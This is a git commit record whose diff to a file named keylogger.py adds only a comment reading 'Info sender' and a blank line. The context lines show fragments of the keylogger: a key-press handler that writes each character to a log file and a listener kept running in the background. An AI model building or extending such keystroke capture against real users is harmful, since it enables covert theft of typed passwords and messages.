fc47407a59d93fef41ee46ca7a63bdabbf7ef10d
MattB Silva <127241122+mattzsync@users.noreply.github.com>
2025-09-13 10:26:19 -0400

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -12,6 +12,7 @@ def keyPressed(key):
             logKey.write(char)
         except:
             print("Error getting char")
+# Info sender
 
 if __name__ == "__main__":
     # creating a listener for every key pressed
@@ -19,3 +20,4 @@ if __name__ == "__main__":
     listener.start()
     # Keeps the program running
     input()
+
